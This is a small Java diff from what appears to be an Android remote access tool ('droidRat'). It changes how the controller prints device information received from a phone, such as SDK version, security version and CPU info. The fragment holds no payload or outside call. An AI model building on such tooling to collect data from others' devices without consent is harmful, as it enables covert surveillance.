@@ -2,6 +2,8 @@ package com.je_chen.droidRat.module.process.receive.data.process;
 
 import com.je_chen.droidRat.module.process.receive.data.process_super.DataFather;
 
+import java.util.Arrays;
+
 public class InfoData extends DataFather {
 
     @Override
@@ -38,8 +40,10 @@ public class InfoData extends DataFather {
             case "Time":
             case "SDKVersion":
             case "SecurityVersion":
-            case "CPUInfo":
                 System.out.println(dataArray[1] + " : " + dataArray[2]);
+                break;
+            case "CPUInfo":
+                System.out.println(Arrays.toString(dataArray));
                 break;
 
         }
